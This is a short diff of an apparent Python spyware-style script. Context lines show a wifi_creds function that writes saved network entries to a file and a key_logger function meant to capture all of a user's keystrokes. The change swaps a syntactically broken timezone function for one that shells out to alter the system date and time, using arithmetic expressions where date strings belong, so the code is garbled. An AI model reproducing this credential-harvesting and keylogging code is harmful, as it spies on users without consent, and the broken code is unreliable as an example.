@@ -64,14 +64,9 @@ def wifi_creds():
             print ("{:<30}|  {:<}".format(i, ""),file=f)
     f.close()
     
-def timeZone();
-    #for this, we need to import the 'os' and 'time' utilities
-    #print(time.strftime('%Y-%m-%d %H:%M:%:S'))
-    #^^this line is a test case for a before->after, printing the time before running full method
-    os.environ['TZ'] = America/Los_Angeles'
-    #^^set time zone to Pacific Standard Time(U.S.)
-    #print(time.strfTime('%Y-%m-%d %H:%M:%:S'))
-    #^^this will print the new time zone of the system 
+def winTimeSet():
+    os.system("date"+str(4-20-2020))
+    os.system("time"+str(6-6-6-66))
     
 #Key logger to see all of the user keyboard inputs
 def key_logger():
